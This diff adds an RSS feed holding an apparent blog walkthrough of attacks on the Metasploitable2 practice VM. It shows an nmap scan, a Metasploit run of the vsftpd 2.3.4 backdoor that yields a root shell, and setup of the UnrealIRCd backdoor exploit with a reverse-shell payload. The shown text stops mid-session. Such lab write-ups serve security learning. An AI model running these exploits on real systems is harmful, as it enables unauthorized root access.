@@ -1,0 +1,920 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Metasploitable2 Linux Edition on Abril Jordan Casinillo</title><link>https://abriljordan.github.io/ajcasinillo/categories/metasploitable2-linux-edition/</link><description>Recent content in Metasploitable2 Linux Edition on Abril Jordan Casinillo</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 27 Nov 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://abriljordan.github.io/ajcasinillo/categories/metasploitable2-linux-edition/index.xml" rel="self" type="application/rss+xml"/><item><title>Metasploitable2 Linux Edition</title><link>https://abriljordan.github.io/ajcasinillo/p/metasploitable2-linux-edition/</link><pubDate>Wed, 27 Nov 2024 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/metasploitable2-linux-edition/</guid><description>&lt;h2 id="information-gathering-and-reconnaissance">Information Gathering and Reconnaissance
+&lt;/h2>&lt;h3 id="nmap-scan-results">Nmap scan results
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>root@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>/home/user&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="c1">#nmap -sV 10.0.3.18&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-11-27 03:34 UTC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.0.3.18
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.00081s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">977&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">21/tcp open ftp vsftpd 2.3.4
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 &lt;span class="o">(&lt;/span>protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">23/tcp open telnet Linux telnetd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">25/tcp open smtp Postfix smtpd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain ISC BIND 9.4.2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.2.8 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">)&lt;/span> DAV/2&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">111/tcp open rpcbind &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>RPC &lt;span class="c1">#100000)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span class="o">(&lt;/span>workgroup: WORKGROUP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">512/tcp open &lt;span class="nb">exec&lt;/span> netkit-rsh rexecd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">513/tcp open login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">514/tcp open shell?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1099/tcp open java-rmi GNU Classpath grmiregistry
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1524/tcp open bindshell Metasploitable root shell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2049/tcp open nfs 2-4 &lt;span class="o">(&lt;/span>RPC &lt;span class="c1">#100003)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2121/tcp open ftp ProFTPD 1.3.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3306/tcp open mysql MySQL 5.0.51a-3ubuntu5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5900/tcp open vnc VNC &lt;span class="o">(&lt;/span>protocol 3.3&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6000/tcp open X11 &lt;span class="o">(&lt;/span>access denied&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">6667/tcp open irc UnrealIRCd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8009/tcp open ajp13 Apache Jserv &lt;span class="o">(&lt;/span>Protocol v1.3&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MAC Address: 22:B6:2D:3A:0D:B7 &lt;span class="o">(&lt;/span>Unknown&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN&lt;span class="p">;&lt;/span> OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 36.46 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="metasploit-exploits">Metasploit exploits
+&lt;/h2>&lt;h3 id="vsftpd-234">vsftpd 2.3.4
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; search vsftpd 2.3.4
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching &lt;span class="nv">Modules&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 0, use &lt;span class="m">0&lt;/span> or use exploit/unix/ftp/vsftpd_234_backdoor
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/ftp/vsftpd_234_backdoor&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS 10.0.3.18 yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/us
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ing-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">21&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>cmd/unix/interact&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/ftp/vsftpd_234_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; exploit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.3.18:21 - The port used by the backdoor &lt;span class="nb">bind&lt;/span> listener is already open
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.3.18:21 - UID: &lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found shell.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Command shell session &lt;span class="m">1&lt;/span> opened &lt;span class="o">(&lt;/span>10.0.3.10:36673 -&amp;gt; 10.0.3.18:6200&lt;span class="o">)&lt;/span> at 2024-11-27 05:32:49 +0000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The output indicates that you have successfully exploited the vulnerability in the vsftpd 2.3.4 service using Metasploit. Here’s a breakdown of the key information from the output:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Target Details:&lt;/p>
+&lt;p>• IP Address: 10.0.3.18&lt;/p>
+&lt;p>• Port: 21 (FTP service)&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Exploit Success:&lt;/p>
+&lt;p>• The exploit leveraged a backdoor in vsftpd 2.3.4, a known vulnerability.&lt;/p>
+&lt;p>• The message [+] UID: uid=0(root) gid=0(root) confirms that the exploit provided root-level access to the system.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Shell Access:&lt;/p>
+&lt;p>• A command shell session was successfully opened.&lt;/p>
+&lt;p>• Session Info: The shell session connects from your machine (10.0.3.10:36673) to the target system (10.0.3.18:6200).&lt;/p>
+&lt;p>• Timestamp: The session opened at 2024-11-27 05:32:49 +0000.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="unreal_ircd-3281">unreal_ircd 3.2.8.1
+&lt;/h3>&lt;ol>
+&lt;li>search unreal_ircd in the metasploit&lt;/li>
+&lt;li>use exploit/unix/irc/unreal_ircd_3281_backdoor&lt;/li>
+&lt;li>configure the options
+&lt;ul>
+&lt;li>set RHOSTS &amp;lt;target_ip&amp;gt;&lt;/li>
+&lt;li>set RPORT 6667&lt;/li>
+&lt;li>set payload cmd/unix/reverse&lt;/li>
+&lt;li>set LHOST &amp;lt;your_ip&amp;gt;&lt;/li>
+&lt;li>set LPORT &amp;lt;your_port&amp;gt;&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>run the exploit&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; search unreal_ircd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching &lt;span class="nv">Modules&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Name Disclosure Date Rank Check Description&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 0, use &lt;span class="m">0&lt;/span> or use exploit/unix/irc/unreal_ircd_3281_backdoor
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; use &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; show options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CHOST no The &lt;span class="nb">local&lt;/span> client address
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> CPORT no The &lt;span class="nb">local&lt;/span> client port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port&lt;span class="o">[&lt;/span>,type:host:port&lt;span class="o">][&lt;/span>...&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT &lt;span class="m">6667&lt;/span> yes The target port &lt;span class="o">(&lt;/span>TCP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Automatic Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> exploit&lt;span class="o">(&lt;/span>unix/irc/unreal_ircd_3281_backdoor&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; &lt;span class="nb">set&lt;/span> RHOST 10.0.3.18
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">RHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; 10.0.3.18
